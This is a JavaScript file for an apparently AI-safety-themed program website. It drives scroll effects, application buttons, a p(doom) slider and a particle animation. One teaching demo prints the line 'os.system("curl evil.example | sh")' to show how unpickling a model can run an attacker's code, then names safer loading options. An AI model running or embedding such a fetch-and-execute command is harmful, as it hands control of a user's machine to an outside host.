(function () {
  var reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  var S = window.SITE || {};

  /* Header turns translucent once you scroll */
  var bar = document.getElementById('top-bar');
  function onScroll() { bar.classList.toggle('scrolled', window.scrollY > 40); }
  window.addEventListener('scroll', onScroll, { passive: true });
  onScroll();

  /* Scroll reveal */
  var items = document.querySelectorAll('.reveal');
  if (reduce || !('IntersectionObserver' in window)) {
    items.forEach(function (el) { el.classList.add('in'); });
  } else {
    var io = new IntersectionObserver(function (entries) {
      entries.forEach(function (e) {
        if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); }
      });
    }, { rootMargin: '0px 0px -8% 0px' });
    items.forEach(function (el) { io.observe(el); });
  }

  /* Apply buttons and timeline follow the dates in _config.yml */
  var today = new Date(); today.setHours(0, 0, 0, 0);
  function day(s) { var p = (s || '').split('-'); return p.length === 3 ? new Date(+p[0], p[1] - 1, +p[2]) : null; }
  var opens = day(S.opens), closes = day(S.closes);
  var state = 'before';
  if (opens && today >= opens) state = 'open';
  if (closes && today > closes) state = 'closed';
  document.querySelectorAll('.apply-btn').forEach(function (b) {
    if (state === 'open' && S.applyUrl) {
      b.textContent = 'Apply now'; b.href = S.applyUrl; b.target = '_blank'; b.rel = 'noopener';
    } else if (state === 'closed') {
      b.textContent = 'Applications closed'; b.setAttribute('aria-disabled', 'true'); b.removeAttribute('href');
    } else {
      b.textContent = 'Applications open ' + (S.opensLabel || ''); b.setAttribute('aria-disabled', 'true');
      if (b.closest('.hero')) b.href = '#join'; else b.removeAttribute('href');
    }
  });
  var steps = document.querySelectorAll('#timeline .step');
  var nowIndex = state === 'before' ? 0 : state === 'open' ? 1 : 2;
  if (steps[nowIndex]) steps[nowIndex].classList.add('now');

  /* 01: loading a pickled model */
  var loadBtn = document.getElementById('load-btn');
  var out = document.getElementById('term-out');
  var lines = [
    ['c', '# unpickling... the file calls __reduce__'],
    ['p', 'os.system("curl evil.example | sh")'],
    ['w', '! a stranger\'s code just ran on your laptop'],
    ['c', '# safer: torch.load(path, weights_only=True)'],
    ['c', '#     or ship weights as .safetensors']
  ];
  var running = false;
  loadBtn.addEventListener('click', function () {
    if (running) return;
    running = true; out.innerHTML = ''; loadBtn.textContent = 'Loading...';
    var i = 0;
    (function next() {
      if (i >= lines.length) { running = false; loadBtn.textContent = 'Load it again'; return; }
      var s = document.createElement('span');
      s.className = lines[i][0]; s.textContent = '\n' + lines[i][1];
      out.appendChild(s); i++;
      setTimeout(next, reduce ? 0 : 420);
    })();
  });

  /* 02: the self-improvement loop */
  var loopBtn = document.getElementById('loop-btn');
  var nodes = document.querySelectorAll('#loop span');
  var looping = false;
  loopBtn.addEventListener('click', function () {
    if (looping) return;
    looping = true;
    nodes.forEach(function (n) { n.classList.remove('on'); });
    var i = 0;
    (function step() {
      if (i >= nodes.length) { looping = false; return; }
      nodes[i].classList.add('on'); i++;
      setTimeout(step, reduce ? 0 : Math.max(120, 520 - i * 90));
    })();
  });

  /* 03: p(doom) */
  var range = document.getElementById('pdoom');
  var pout = document.getElementById('pdoom-out');
  var verdict = document.getElementById('verdict');
  var touched = false;
  function judge() {
    var v = +range.value;
    pout.textContent = v + '%';
    if (!touched) return;
    var msg;
    if (v < 5) msg = 'Lower than the typical AI researcher. The median answer was about 5%.';
    else if (v < 10) msg = 'Close to the typical AI researcher. The median answer was about 5%.';
    else if (v < 50) msg = 'You are with a large minority: 38–51% of researchers put it at 10% or higher, depending on how the question was asked.';
    else msg = 'Higher than most researchers surveyed. Still, 38–51% of them put it at 10% or higher.';
    verdict.textContent = msg;
  }
  range.addEventListener('input', function () { touched = true; judge(); });
  judge();

  /* Hero: a quiet field of connected points */
  var c = document.getElementById('field');
  if (!c || !c.getContext) return;
  var ctx = c.getContext('2d');
  var dpr = Math.min(window.devicePixelRatio || 1, 2);
  var W, H, pts = [], mouse = { x: -9999, y: -9999 };
  function size() {
    W = c.clientWidth; H = c.clientHeight;
    c.width = W * dpr; c.height = H * dpr; ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    var n = Math.round(Math.min(90, W * H / 14000));
    pts = [];
    for (var i = 0; i < n; i++) pts.push({ x: Math.random() * W, y: Math.random() * H, vx: (Math.random() - .5) * .25, vy: (Math.random() - .5) * .25 });
  }
  function draw() {
    ctx.clearRect(0, 0, W, H);
    for (var i = 0; i < pts.length; i++) {
      var p = pts[i];
      for (var j = i + 1; j < pts.length; j++) {
        var q = pts[j], dx = p.x - q.x, dy = p.y - q.y, d = dx * dx + dy * dy;
        if (d < 15000) {
          ctx.strokeStyle = 'rgba(255,79,163,' + (0.16 * (1 - d / 15000)) + ')';
          ctx.lineWidth = 1; ctx.beginPath(); ctx.moveTo(p.x, p.y); ctx.lineTo(q.x, q.y); ctx.stroke();
        }
      }
      var mx = p.x - mouse.x, my = p.y - mouse.y, md = Math.sqrt(mx * mx + my * my);
      var glow = md < 160 ? 1 - md / 160 : 0;
      ctx.fillStyle = 'rgba(255,79,163,' + (0.35 + glow * 0.6) + ')';
      ctx.beginPath(); ctx.arc(p.x, p.y, 1.6 + glow * 1.6, 0, Math.PI * 2); ctx.fill();
    }
  }
  function tick() {
    for (var i = 0; i < pts.length; i++) {
      var p = pts[i];
      p.x += p.vx; p.y += p.vy;
      if (p.x < 0 || p.x > W) p.vx *= -1;
      if (p.y < 0 || p.y > H) p.vy *= -1;
    }
    draw();
    if (!document.hidden && visible) raf = requestAnimationFrame(tick); else raf = null;
  }
  var raf = null, visible = true;
  size(); draw();
  window.addEventListener('resize', function () { size(); draw(); });
  c.parentElement.addEventListener('pointermove', function (e) {
    var r = c.getBoundingClientRect(); mouse.x = e.clientX - r.left; mouse.y = e.clientY - r.top;
    if (reduce) draw();
  });
  c.parentElement.addEventListener('pointerleave', function () { mouse.x = mouse.y = -9999; if (reduce) draw(); });
  if (!reduce) {
    new IntersectionObserver(function (e) { visible = e[0].isIntersecting; if (visible && !raf) raf = requestAnimationFrame(tick); }).observe(c);
    document.addEventListener('visibilitychange', function () { if (!document.hidden && visible && !raf) raf = requestAnimationFrame(tick); });
  }
})();
